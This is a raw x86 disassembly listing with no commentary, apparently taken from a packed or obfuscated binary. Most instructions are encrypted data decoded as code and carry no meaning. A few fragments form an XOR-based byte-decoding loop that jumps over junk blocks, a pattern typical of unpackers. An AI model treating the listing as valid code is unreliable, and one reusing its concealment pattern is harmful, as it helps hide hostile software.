  405021:	jnp    0x40501c
  405023:	lds    edx,FWORD PTR [ecx]
  405025:	adc    ah,BYTE PTR [esi+0x5f0a3dcf]
  40502b:	scas   al,BYTE PTR es:[edi]
  40502c:	dec    ebp
  40502d:	push   ecx
  40502e:	or     bl,bh
  405030:	outs   dx,BYTE PTR ds:[esi]
  405031:	aad    0x65
  405033:	fcmovnu st,st(2)
  405035:	adc    BYTE PTR [ecx-0x25],ch
  405038:	sub    eax,0x4f211312
  40503d:	mov    ch,0x4b
  40503f:	dec    ebx
  405040:	inc    ecx
  405041:	cmp    ch,BYTE PTR [esi]
  405043:	dec    esi
  405044:	jmp    0xd023:0x5dc4d050
  40504b:	shr    ebp,0xf7
  40504e:	bound  esp,QWORD PTR [eax]
  405050:	dec    ebp
  405051:	mov    eax,ds:0x81ae6cf0
  405056:	jbe    0x405097
  405058:	pushf  
  405059:	mov    eax,0xd465567c
  40505e:	scas   al,BYTE PTR es:[edi]
  40505f:	push   esp
  405060:	std    
  405061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405062:	loopne 0x405096
  405064:	jecxz  0x405066
  405066:	and    edx,DWORD PTR [edi-0x45510d4e]
  40506c:	(bad)  
  40506d:	pusha  
  40506e:	mov    edx,0xdf788086
  405073:	inc    esp
  405074:	addr16 pop esp
  405076:	mov    edi,eax
  405078:	nop
  405079:	adc    al,0xd8
  40507b:	jge    0x40500f
  40507d:	int3   
  40507e:	mov    dh,0x6c
  405080:	jno    0x4050f9
  405082:	and    eax,0x7a67433
  405087:	adc    DWORD PTR [ecx+0x61b455d3],esi
  40508d:	mov    cl,0xa1
  40508f:	add    bh,BYTE PTR [eax+0x53b69b92]
  405095:	add    DWORD PTR [esi-0x43a7c2e3],esp
  40509b:	sub    ch,BYTE PTR gs:[esi+0x17]
  40509f:	jbe    0x4050ea
  4050a1:	or     eax,0x59867f4
  4050a6:	push   ss
  4050a7:	pop    ss
  4050a8:	sahf   
  4050a9:	add    BYTE PTR [edx],cl
  4050ab:	xchg   ebp,eax
  4050ac:	stos   DWORD PTR es:[edi],eax
  4050ad:	xor    eax,eax
  4050af:	dec    ecx
  4050b0:	mov    esi,0xc741881c
  4050b5:	push   es
  4050b6:	imul   esi,DWORD PTR [ebx+eiz*2-0x21],0xfffffff6
  4050bb:	dec    ebx
  4050bc:	cmc    
  4050bd:	mov    DWORD PTR [ecx-0x36e054bb],0x3d79f345
  4050c7:	mov    edi,0xffcd8d68
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx-0x1a787702],bh
  4050fc:	or     eax,ebp
  4050fe:	xor    BYTE PTR [eax+0x78],bh
  405101:	dec    ebp
  405102:	jle    0x40517c
  405104:	js     0x4050e8
  405106:	enter  0xf37c,0x2c
  40510a:	jb     0x4050bb
  40510c:	cmp    al,0x83
  40510e:	(bad)
  405111:	rol    bh,0x6f
  405114:	popa   
  405115:	cld    
  405116:	adc    eax,DWORD PTR [eax-0x12]
  405119:	lds    ebp,FWORD PTR [edi+0x110fde2e]
  40511f:	mov    ah,0xf5
  405121:	cmc    
  405122:	mov    esi,0xd5804c96
  405127:	aas    
  405128:	repnz push cs
  40512a:	lock mov eax,ds:0xda0269ce
  405130:	dec    eax
  405131:	cmp    eax,esp
  405133:	popf   
  405134:	int3   
  405135:	jecxz  0x405191
  405137:	and    BYTE PTR [esi+0x12f8041e],dh
  40513d:	ins    BYTE PTR es:[edi],dx
  40513e:	scas   al,BYTE PTR es:[edi]
  40513f:	jmp    0x4050f7
  405141:	nop
  405142:	dec    edi
  405143:	outs   dx,BYTE PTR ds:[esi]
  405144:	cmp    DWORD PTR [ecx-0x11],esi
  405147:	push   ecx
  405148:	aas    
  405149:	cwde   
  40514a:	add    bl,BYTE PTR [esi]
  40514c:	repz push esp
  40514f:	inc    esp
  405150:	mov    eax,0xa11bcc35
  405155:	pop    ebp
  405156:	and    bl,BYTE PTR [ebp-0x76]
  405159:	call   0x89616f03
  40515e:	cmp    cl,BYTE PTR [ebx+0x6]
  405161:	or     DWORD PTR [edi],esi
  405163:	mov    dh,0x79
  405165:	add    ah,dh
  405167:	adc    esp,ecx
  405169:	push   0x63
  40516b:	mov    cl,dh
  40516d:	ret    
  40516e:	xchg   edx,eax
  40516f:	xor    BYTE PTR [edi],dh
  405171:	or     al,BYTE PTR [edx]
  405173:	mov    ds:0x8d60a6ec,al
  405178:	adc    BYTE PTR [esp+eax*8-0x38a7aaed],al
  40517f:	out    dx,eax
  405180:	mov    dl,0xd2
  405182:	aas    
  405183:	dec    edi
  405184:	or     al,0xba
  405186:	mov    al,ds:0x24e230f6
  40518b:	cwde   
  40518c:	pushf  
  40518d:	dec    edx
  40518e:	adc    eax,0xc7bc8097
  405193:	mov    ds:0xace16280,eax
  405198:	stc    
  405199:	jae    0x4051ad
  40519b:	ret    0x9c10
  40519e:	sbb    bh,BYTE PTR [ebx]
  4051a0:	nop
  4051a1:	in     eax,dx
  4051a2:	scas   al,BYTE PTR es:[edi]
  4051a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a4:	(bad)  
  4051a5:	call   0x8271:0xd4f86c9
  4051ac:	mov    ebp,0xaefc67c3
  4051b1:	dec    edx
  4051b2:	imul   edi,DWORD PTR [edi+0x7f],0xffffffb9
  4051b6:	scas   al,BYTE PTR es:[edi]
  4051b7:	sahf   
  4051b8:	js     0x4051d7
  4051ba:	test   eax,0xa96f9fa0
  4051bf:	pop    esp
  4051c0:	(bad)  
  4051c1:	ror    BYTE PTR [ebx-0x7dde9450],0xa1
  4051c8:	pop    edi
  4051c9:	jge    0x405202
  4051cb:	inc    ecx
  4051cc:	and    edi,DWORD PTR [eax]
  4051ce:	in     al,0xac
  4051d0:	xchg   esp,eax
  4051d1:	loope  0x40524d
  4051d3:	inc    eax
  4051d4:	mov    edx,0xb66a7bf1
  4051d9:	sbb    eax,0xc5d824f9
  4051de:	or     edx,DWORD PTR [bp+si]
  4051e1:	dec    ecx
  4051e2:	aaa    
  4051e3:	test   al,0xf
  4051e5:	mov    ecx,0x7256e80f
  4051ea:	sbb    ebx,DWORD PTR [ebp+0x65]
  4051ed:	mov    dh,0x6f
  4051ef:	and    BYTE PTR [edi+0xfd0cffa],ch
  4051f5:	pop    ecx
  4051f6:	ja     0x4051de
  4051f8:	add    BYTE PTR [esi],0x5d
  4051fb:	addr16 or ecx,ecx
  4051fe:	test   BYTE PTR [ebx-0x58],0x83
  405202:	sbb    ah,BYTE PTR [ecx]
  405204:	fwait
  405205:	cmp    DWORD PTR [edi+0x5d],ecx
  405208:	mov    edi,0x434923ab
  40520d:	push   ecx
  40520e:	pop    ss
  40520f:	cmp    edx,ecx
  405211:	dec    esi
  405212:	inc    BYTE PTR [edi]
  405214:	out    0xf2,al
  405216:	jne    0x4051b7
  405218:	js     0x40519f
  40521a:	mov    eax,ds:0xb1e5ac70
  40521f:	ror    BYTE PTR [ecx],cl
  405221:	mov    al,0x43
  405223:	(bad)  
  405224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405225:	cmp    ah,BYTE PTR cs:[esi-0x12147cca]
  40522c:	inc    BYTE PTR [ecx-0x3e]
  40522f:	cmp    BYTE PTR [edi+0x18f1548d],ah
  405235:	mov    esp,0xe9d09765
  40523a:	test   eax,0xca1a6d1c
  40523f:	mov    dl,0xbb
  405241:	scas   al,BYTE PTR es:[edi]
  405242:	mov    al,ds:0x493eb864
  405247:	lds    esi,FWORD PTR [ebx]
  405249:	mov    ebx,0x6f2341d
  40524e:	mov    gs,WORD PTR [edx]
  405250:	jbe    0x405282
  405252:	mov    bh,0x29
  405254:	mov    es,WORD PTR [esi+0x58]
  405257:	aad    0x5a
  405259:	fistp  QWORD PTR [ecx-0x35181e9a]
  40525f:	mov    ch,0x8
  405261:	or     eax,0x2f5ce0bc
  405266:	nop
  405267:	jmp    0x285d:0xcc48217e
  40526e:	xor    cl,bh
  405270:	lahf   
  405271:	dec    edx
  405272:	sbb    DWORD PTR [eax-0x1222a0cb],0xb6e7d9cc
  40527c:	(bad)  
  40527d:	dec    edi
  40527e:	fld    TBYTE PTR [eax]
  405280:	pusha  
  405281:	ror    BYTE PTR [edi-0x5f08645d],cl
  405287:	popa   
  405288:	arpl   WORD PTR [ebx+0x75],dx
  40528b:	jl     0x405293
  40528d:	sub    ah,dl
  40528f:	mov    ch,0xf6
  405291:	sub    eax,0x316bd5e4
  405296:	ja     0x4052d6
  405298:	mov    ebx,0xb49033f4
  40529d:	and    edx,esi
  40529f:	mov    edi,0xcec9114a
  4052a4:	les    esp,FWORD PTR [ebx+0x39]
  4052a7:	xchg   ecx,eax
  4052a8:	mov    eax,ds:0x18ec4b0e
  4052ad:	retf   
  4052ae:	enter  0xd5b4,0x39
  4052b2:	sbb    eax,0xc7b6d71c
  4052b7:	into   
  4052b8:	mov    ss:0xc64aee83,eax
  4052be:	jecxz  0x4052fa
  4052c0:	jle    0x40532c
  4052c2:	mov    DWORD PTR [ecx-0x66b1c983],ebx
  4052c8:	shr    DWORD PTR cs:[esi+0x3a18e7ca],0xa3
  4052d0:	or     al,0xe5
  4052d2:	into   
  4052d3:	or     DWORD PTR [edi-0x32f71527],ebx
  4052d9:	xchg   ebp,eax
  4052da:	mov    ch,0x46
  4052dc:	pop    ss
  4052dd:	clc    
  4052de:	push   0xd
  4052e0:	or     DWORD PTR [edx+0x6f57e1b3],edi
  4052e6:	sbb    esp,ebp
  4052e8:	arpl   ax,bx
  4052ea:	pop    ebx
  4052eb:	pusha  
  4052ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052ed:	dec    edi
  4052ee:	push   edx
  4052ef:	imul   ebx,DWORD PTR ds:0x7534a6c8,0xf078293d
  4052f9:	adc    ax,0xdfcb
  4052fd:	dec    eax
  4052fe:	(bad)  
  4052ff:	mov    ah,0xd5
  405301:	loope  0x405295
  405303:	mov    ch,0x88
  405305:	ins    BYTE PTR es:[edi],dx
  405306:	mov    edx,0x1afbc4e3
  40530b:	mov    dl,BYTE PTR [edx-0x3]
  40530e:	mov    edx,0x9fbc9961
  405313:	cmp    dh,BYTE PTR [edx]
  405315:	inc    edi
  405316:	js     0x405335
  405318:	cdq    
  405319:	(bad)  
  40531b:	mov    dl,0xfe
  40531d:	push   esi
  40531e:	dec    ebx
  40531f:	lods   al,BYTE PTR ds:[esi]
  405320:	call   0x23872727
  405325:	cmp    edx,DWORD PTR [esi-0x58817a3e]
  40532b:	jl     0x4052f3
  40532d:	cwde   
  40532e:	xchg   edi,eax
  40532f:	test   DWORD PTR [edi-0x40610a1b],ebp
  405335:	in     al,dx
  405336:	mov    ah,0x26
  405338:	mov    dl,0x77
  40533a:	push   0xffffffd6
  40533c:	dec    ebp
  40533d:	cmp    al,0x75
  40533f:	das    
  405340:	xor    esi,DWORD PTR [ecx]
  405342:	inc    edi
  405343:	add    ah,BYTE PTR [eax]
  405345:	adc    ebx,ebx
  405347:	cwde   
  405348:	dec    esp
  405349:	sub    al,0xc3
  40534b:	cmp    DWORD PTR [eiz*8-0x3a18c199],esi
  405352:	mov    ecx,0xe292749d
  405357:	mov    bh,0x63
  405359:	dec    eax
  40535a:	mov    al,ds:0xc9f59a9
  40535f:	shl    BYTE PTR [esi+edx*4+0x732fe188],cl
  405366:	xlat   BYTE PTR ds:[ebx]
  405367:	push   ebp
  405368:	(bad)  
  405369:	mov    ebp,0x68ba8288
  40536e:	xchg   DWORD PTR [edx+eax*2],ebx
  405371:	xchg   ebx,eax
  405372:	clc    
  405373:	push   ds
  405374:	call   0x39d56843
  405379:	xchg   esi,eax
  40537a:	push   sp
  40537c:	scas   eax,DWORD PTR es:[edi]
  40537d:	adc    DWORD PTR [ecx+0x39ed989b],esi
  405383:	cwde   
  405384:	enter  0xd820,0x82
  405388:	and    esi,ecx
  40538a:	inc    ebx
  40538b:	jle    0x4053c4
  40538d:	add    al,0x1f
  40538f:	pop    ebp
  405390:	push   0x14bfeade
  405395:	pop    ebx
  405396:	jne    0x4053bc
  405398:	xchg   ebx,eax
  405399:	pop    ebp
  40539a:	and    edi,edx
  40539c:	dec    edx
  40539d:	in     eax,dx
  40539e:	mov    dh,al
  4053a0:	(bad)
  4053a4:	inc    esp
  4053a5:	push   DWORD PTR [esi+0x40]
  4053a8:	push   0xffffffe7
  4053aa:	mov    edi,0x3f9adf82
  4053af:	loop   0x40533c
  4053b1:	cdq    
  4053b2:	xchg   ebp,eax
  4053b3:	mov    ah,0x5f
  4053b5:	shl    DWORD PTR [ebx-0x54],1
  4053b8:	push   ecx
  4053b9:	fdivr  QWORD PTR [esp+eiz*4-0x50b3185b]
  4053c0:	push   0xffffffad
  4053c2:	fbstp  TBYTE PTR [esi-0x377e23c]
  4053c8:	xchg   ebx,eax
  4053c9:	into   
  4053ca:	jle    0x405435
  4053cc:	pop    esp
  4053cd:	imul   ecx,DWORD PTR [ebx],0x3d
  4053d0:	retf   0x547
  4053d3:	fcom   QWORD PTR [edi-0x28]
  4053d6:	jmp    0x405421
  4053d8:	mov    eax,DWORD PTR [ebp-0x8]
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fsubr  QWORD PTR ds:0x3d6cadf5
  4053f1:	xor    eax,0x7e4d7878
  4053f6:	js     0x405470
  4053f8:	loop   0x4053b5
  4053fa:	or     ebx,DWORD PTR [edi]
  4053fc:	(bad)  
  4053fd:	adc    eax,0xddfd3e37
  405402:	inc    esi
  405403:	popa   
  405404:	fucomip st,st(2)
  405406:	push   esi
  405407:	mov    ecx,0x21304ef
  40540c:	mov    ecx,0xd20bbbf4
  405411:	xchg   edx,eax
  405412:	ins    DWORD PTR es:[edi],dx
  405413:	and    ch,BYTE PTR [esi+0xe]
  405416:	xchg   ecx,eax
  405417:	jae    0x4053c6
  405419:	jp     0x4053f4
  40541b:	daa    
  40541c:	ds loop 0x4053de
  40541f:	or     eax,0x6712391c
  405424:	add    al,0x3c
  405426:	nop
  405427:	sub    al,0x6e
  405429:	push   edx
  40542a:	mov    bl,0x63
  40542c:	dec    edi
  40542d:	xchg   ebp,eax
  40542e:	or     BYTE PTR [eax],0x6d
  405431:	clc    
  405432:	int    0x79
  405434:	imul   esi,DWORD PTR [eax+0x71eb562a],0x344309ea
  40543e:	or     bh,bh
  405440:	jae    0x4053ed
  405442:	dec    esi
  405443:	dec    ebp
  405444:	outs   dx,DWORD PTR cs:[esi]
  405446:	and    eax,0x1ed94221
  40544b:	mov    cl,BYTE PTR [eax-0xcc73729]
  405451:	popf   
  405452:	add    al,0x47
  405454:	jle    0x405462
  405456:	push   es
  405457:	push   ss
  405458:	fxch   st(0)
  40545a:	mov    esi,0xf7cb613e
  40545f:	bound  edx,QWORD PTR [eax]
  405461:	stos   BYTE PTR es:[edi],al
  405462:	in     eax,0x4c
  405464:	enter  0x96d4,0x57
  405468:	sbb    BYTE PTR [edi+0x4c],ah
  40546b:	push   edx
  40546c:	daa    
  40546d:	enter  0x6e7d,0x6a
  405471:	in     al,dx
  405472:	inc    eax
  405473:	adc    al,0xf
  405475:	cmp    al,0x70
  405477:	jle    0x40542d
  405479:	jns    0x4054d5
  40547b:	or     DWORD PTR [esi+ebx*4],edi
  40547e:	fisttp WORD PTR [edi+0x3e]
  405481:	ret    0xaab8
  405484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405485:	mov    dh,0xc2
  405487:	arpl   WORD PTR [eax+0x16],bp
  40548a:	jbe    0x4054ac
  40548c:	inc    ebp
  40548d:	scas   al,BYTE PTR es:[edi]
  40548e:	fxch   st(3)
  405490:	ss or  al,0x42
  405493:	fcmove st,st(7)
  405495:	jecxz  0x405497
  405497:	inc    ebp
  405498:	clc    
  405499:	and    al,0xf7
  40549b:	imul   edi,DWORD PTR [esi+0x301a8dd1],0xfffffff8
  4054a2:	shl    BYTE PTR [ecx],cl
  4054a4:	mov    eax,0x5a6734de
  4054a9:	dec    ecx
  4054aa:	sbb    BYTE PTR [esi],0xe
  4054ad:	add    BYTE PTR ds:0x867858a,0xbf
  4054b4:	adc    dh,ah
  4054b6:	lds    esp,FWORD PTR [ecx-0x66]
  4054b9:	jne    0x4054f3
  4054bb:	mov    dl,0x29
  4054bd:	inc    esi
  4054be:	sbb    ch,ch
  4054c0:	dec    ebx
  4054c1:	mov    ecx,DWORD PTR [edi-0x6d7ff2c]
  4054c7:	lock scas al,BYTE PTR es:[edi]
  4054c9:	jl     0x4054fc
  4054cb:	(bad)  
  4054cc:	(bad)  
  4054cd:	mov    edi,0x1c0d0197
  4054d2:	out    dx,al
  4054d3:	stc    
  4054d4:	cmp    eax,0x63aa56b5
  4054d9:	into   
  4054da:	jno    0x40547b
  4054dc:	std    
  4054dd:	aam    0xe3
  4054df:	rol    BYTE PTR ds:[ebx+0x2d],cl
  4054e3:	sti    
  4054e4:	ror    DWORD PTR [ebp-0x35118c77],1
  4054ea:	jl     0x405569
  4054ec:	aas    
  4054ed:	not    DWORD PTR [edx]
  4054ef:	pop    es
  4054f0:	push   eax
  4054f1:	jae    0x40547c
  4054f3:	aaa    
  4054f4:	mul    DWORD PTR [ebx+0x4834a4b2]
  4054fa:	shl    BYTE PTR [eax+0x476d7bfa],cl
  405500:	and    BYTE PTR [eax+0x25],cl
  405503:	add    esi,DWORD PTR gs:[ecx-0x7c3dff8a]
  40550a:	add    cl,ah
  40550c:	mov    al,0xb7
  40550e:	push   esp
  40550f:	jno    0x4054ef
  405511:	mov    al,ds:0x56d2bf0e
  405516:	mov    esp,0x82e9d3f7
  40551b:	aas    
  40551c:	push   cs
  40551d:	push   esp
  40551e:	cmp    ecx,DWORD PTR [edi-0x4a297863]
  405524:	push   ecx
  405525:	stc    
  405526:	popf   
  405527:	cs inc edx
  405529:	push   eax
  40552a:	add    al,0xec
  40552c:	adc    al,0x7a
  40552e:	or     edi,esi
  405530:	sub    edx,DWORD PTR [ebx-0x266c2072]
  405536:	dec    ecx
  405537:	jno    0x405588
  405539:	iret   
  40553a:	sbb    esi,0x47
  40553d:	adc    BYTE PTR [ecx],0x18
  405540:	retf   
  405541:	xchg   edi,eax
  405542:	call   0x4c18:0x7875504d
  405549:	ins    DWORD PTR es:[edi],dx
  40554a:	out    0x48,eax
  40554c:	adc    eax,ebp
  40554e:	jno    0x40553b
  405550:	mov    esp,0x44e95ff2
  405555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405556:	or     DWORD PTR [ebx+0x35],esp
  405559:	inc    eax
  40555a:	inc    eax
  40555b:	sub    dl,cl
  40555d:	add    eax,0xc1d0bde0
  405562:	pop    ecx
  405563:	enter  0x2127,0xea
  405567:	lahf   
  405568:	repnz adc esp,DWORD PTR [edx-0x77de58b1]
  40556f:	or     ah,BYTE PTR ds:0x6a72900f
  405575:	dec    esp
  405576:	(bad)  
  405577:	pop    esi
  405578:	dec    esi
  405579:	stos   BYTE PTR es:[edi],al
  40557a:	loope  0x4055fb
  40557c:	dec    ebx
  40557d:	ds push ecx
  40557f:	lods   al,BYTE PTR ds:[esi]
  405580:	xor    al,0xc
  405582:	cwde   
  405583:	cs mov ah,0x70
  405586:	sbb    al,0xf8
  405588:	xchg   edi,eax
  405589:	inc    esp
  40558a:	pop    es
  40558b:	in     eax,dx
  40558c:	adc    bh,BYTE PTR [eax]
  40558e:	je     0x40556b
  405590:	rcl    edx,1
  405592:	scas   al,BYTE PTR es:[edi]
  405593:	(bad)  
  405594:	aam    0xb8
  405596:	or     dh,ch
  405598:	bound  ecx,QWORD PTR [ebp+ebx*8-0x637c8bcb]
  40559f:	xor    al,0x8f
  4055a1:	in     al,0x80
  4055a3:	cli    
  4055a4:	(bad)  
  4055a5:	outs   dx,WORD PTR ds:[esi]
  4055a7:	xchg   edi,eax
  4055a8:	inc    esi
  4055a9:	pop    ss
  4055aa:	lods   eax,DWORD PTR ds:[si]
  4055ac:	pop    es
  4055ad:	and    BYTE PTR [ebx+0x75],ah
  4055b0:	sub    ah,BYTE PTR cs:[esi]
  4055b3:	push   ebx
  4055b4:	std    
  4055b5:	scas   al,BYTE PTR es:[edi]
  4055b6:	jmp    0x4055ae
  4055b8:	xchg   esp,eax
  4055b9:	ret    0xd5f5
  4055bc:	mov    ebp,esi
  4055be:	push   ss
  4055bf:	inc    ecx
  4055c0:	std    
  4055c1:	push   ss
  4055c2:	(bad)  [ebx]
  4055c4:	pushf  
  4055c5:	sub    eax,0x4ab830ed
  4055ca:	mov    ecx,0x95833b77
  4055cf:	mov    dl,0x70
  4055d1:	dec    esi
  4055d2:	push   esp
  4055d3:	test   bl,0x6f
  4055d6:	loopne 0x405623
  4055d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055d9:	test   BYTE PTR [eax-0xc],0x2e
  4055dd:	add    DWORD PTR [ebx+0x5ab75825],0x1ba073a9
  4055e7:	rcr    BYTE PTR [ecx],0xe0
  4055ea:	ror    DWORD PTR [esi+0x174455d0],1
  4055f0:	sbb    BYTE PTR [ebp-0x12],0x47
  4055f4:	push   0x8900d2d
  4055f9:	add    al,0x2a
  4055fb:	mov    ch,0x3f
  4055fd:	jl     0x4055c2
  4055ff:	call   0xac92a9af
  405604:	or     eax,0x25a7604a
  405609:	aaa    
  40560a:	je     0x40567b
  40560c:	cmp    BYTE PTR [esi],0x9c
  40560f:	out    0x94,al
  405611:	test   edx,esi
  405613:	add    al,0xe5
  405615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405616:	repnz in eax,dx
  405618:	dec    edi
  405619:	cmp    dh,BYTE PTR [eax-0x16decc88]
  40561f:	das    
  405620:	and    al,0xf6
  405622:	int3   
  405623:	adc    BYTE PTR [ebx],dh
  405625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405626:	iret   
  405627:	rcl    DWORD PTR [ebx],1
  405629:	fs and al,0x39
  40562c:	sbb    eax,0x24f15e05
  405631:	mov    ebp,esi
  405633:	dec    ebp
  405634:	mov    esp,0xaffee4be
  405639:	mov    edx,0x4519d402
  40563e:	xchg   ebx,eax
  40563f:	jnp    0x4055c4
  405641:	pop    ecx
  405642:	in     al,0x3e
  405644:	add    DWORD PTR [edi+0x14b16e89],edx
  40564a:	lahf   
  40564b:	loop   0x405641
  40564d:	add    BYTE PTR [ebx+0x3b92a2d0],bl
  405653:	mov    bl,0xee
  405655:	sub    cl,BYTE PTR [ecx]
  405657:	xlat   BYTE PTR ds:[ebx]
  405658:	inc    eax
  405659:	jne    0x405641
  40565b:	pop    edx
  40565c:	sub    eax,0xc874a2c1
  405661:	mov    bh,0xdb
  405663:	and    DWORD PTR [edx+edx*2],edx
  405666:	je     0x405643
  405668:	lods   al,BYTE PTR ds:[esi]
  405669:	rol    BYTE PTR [esi+ebp*4],cl
  40566c:	dec    edi
  40566d:	popa   
  40566e:	dec    ebx
  40566f:	push   ds
  405670:	inc    ebp
  405671:	mov    bl,0x0
  405673:	jno    0x40566a
  405675:	push   cs
  405676:	retf   
  405677:	iret   
  405678:	cmovp  ecx,DWORD PTR [ebx]
  40567b:	and    BYTE PTR [eax],ah
  40567d:	and    BYTE PTR [ecx-0x80],al
  405680:	xor    ecx,0x81fe9b10
  405686:	pop    esi
  405687:	push   ebp
  405688:	jb     0x40567d
  40568a:	cli    
  40568b:	dec    esp
  40568c:	std    
  40568d:	(bad)  
  40568e:	xchg   DWORD PTR [esi+eiz*2-0x5b],edx
  405692:	(bad)  
  405693:	aaa    
  405694:	adc    al,0x46
  405696:	inc    esi
  405697:	dec    eax
  405698:	push   ebp
  405699:	or     DWORD PTR [ebx+0x22],esp
  40569c:	add    eax,0x1b9be96e
  4056a1:	cdq    
  4056a2:	xchg   edi,eax
  4056a3:	xor    al,0x68
  4056a5:	shr    DWORD PTR [ecx],0x4f
  4056a8:	std    
  4056a9:	ret    0x75ef
  4056ac:	ds mov edi,0xadae05b0
  4056b2:	and    BYTE PTR [ebx+0x1d],0x63
  4056b6:	std    
  4056b7:	ret    
  4056b8:	leave  
  4056b9:	arpl   WORD PTR [ebx],si
  4056bb:	sbb    ah,BYTE PTR [ebp-0x7d7897ec]
  4056c1:	xlat   BYTE PTR ds:[ebx]
  4056c2:	xchg   esp,eax
  4056c3:	mov    edx,0x32e3bd72
  4056c8:	test   BYTE PTR [ecx-0x13],dl
  4056cb:	mov    edi,DWORD PTR [ebp-0x4]
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	fdiv   st(7),st
  405714:	lahf   
  405715:	fcom   QWORD PTR [edx]
  405717:	cmp    bh,BYTE PTR [eax+0x78]
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x405764
  40571f:	xor    dl,dl
  405721:	cwde   
  405722:	sub    al,BYTE PTR [ecx+0x7e80de76]
  405728:	mov    eax,ds:0xea950e24
  40572d:	jns    0x4056c3
  40572f:	or     al,al
  405731:	jae    0x405798
  405733:	inc    edi
  405734:	add    eax,0x85bcbb55
  405739:	dec    eax
  40573a:	dec    esi
  40573b:	pop    ecx
  40573c:	das    
  40573d:	jle    0x405700
  40573f:	mov    bl,0x9c
  405741:	jmp    FWORD PTR [ebp+0x3d45663b]
  405747:	push   eax
  405748:	inc    eax
  405749:	into   
  40574a:	jl     0x4056ef
  40574c:	rcr    BYTE PTR [ecx-0x1edf8330],0x42
  405753:	cwde   
  405754:	adc    esi,DWORD PTR [eax-0x53bdb80e]
  40575a:	xor    dh,dh
  40575c:	or     BYTE PTR [edi+edi*4],bh
  40575f:	stc    
  405760:	neg    BYTE PTR [ecx+0x1ff706b7]
  405766:	or     eax,ecx
  405768:	sbb    BYTE PTR [ebx+edi*8],ch
  40576b:	iret   
  40576c:	sbb    eax,0x91a5d4fb
  405771:	call   0xff87:0x9d69638d
  405778:	jns    0x4057dd
  40577a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40577b:	aaa    
  40577c:	mov    edx,0x1e249c85
  405781:	cmp    eax,0x1afc6c2b
  405786:	cwde   
  405787:	in     eax,dx
  405788:	(bad)  
  405789:	and    dh,cl
  40578b:	mov    DWORD PTR ds:0xc863d42e,edx
  405791:	jne    0x4057a4
  405793:	pop    ds
  405794:	stc    
  405795:	jge    0x4057e3
  405797:	pushf  
  405798:	or     al,BYTE PTR [esi-0x27a060af]
  40579e:	fsubr  DWORD PTR [ebp-0x18]
  4057a1:	jo     0x4057eb
  4057a3:	fdivrp st(1),st
  4057a5:	arpl   WORD PTR [edx+eiz*4],di
  4057a8:	fwait
  4057a9:	ret    
  4057aa:	inc    esp
  4057ab:	adc    eax,0xd653cb82
  4057b0:	outs   dx,DWORD PTR ds:[esi]
  4057b1:	ss daa 
  4057b3:	dec    esi
  4057b5:	dec    eax
  4057b6:	call   0x81b0:0x25e5
  4057bc:	in     al,0x8b
  4057be:	add    DWORD PTR [edx-0x2f],eax
  4057c1:	retf   
  4057c2:	fcmove st,st(2)
  4057c4:	fisubr DWORD PTR [esi+ebx*2]
  4057c7:	repnz pop ds
  4057c9:	mov    BYTE PTR [ecx-0x5d],cl
  4057cc:	dec    edi
  4057cd:	adc    edx,DWORD PTR [esi]
  4057cf:	push   0x3a
  4057d1:	in     al,dx
  4057d2:	cmc    
  4057d3:	call   0x63d5:0x1b1e9a84
  4057da:	adc    DWORD PTR [esi],eax
  4057dc:	in     al,dx
  4057dd:	int    0x1d
  4057df:	sbb    esi,DWORD PTR [ebp+ebx*8-0x1d54c1b8]
  4057e6:	popf   
  4057e7:	adc    edi,DWORD PTR ds:0x63e567a6
  4057ed:	cwde   
  4057ee:	inc    esi
  4057ef:	fadd   DWORD PTR [eax-0x32]
  4057f2:	push   ds
  4057f3:	ja     0x4057b8
  4057f5:	xchg   esi,eax
  4057f6:	lods   al,BYTE PTR ds:[esi]
  4057f7:	pop    eax
  4057f8:	cmp    DWORD PTR [edx+0x56],ebx
  4057fb:	icebp  
  4057fc:	jmp    0x405809
  4057fe:	daa    
  4057ff:	xchg   BYTE PTR [edx],bh
  405801:	mov    edx,0xead03570
  405806:	fcmovnu st,st(3)
  405808:	xor    al,0x5c
  40580a:	or     al,0xde
  40580c:	ficomp WORD PTR [eax-0x23]
  40580f:	cmp    esp,DWORD PTR [eax-0x2]
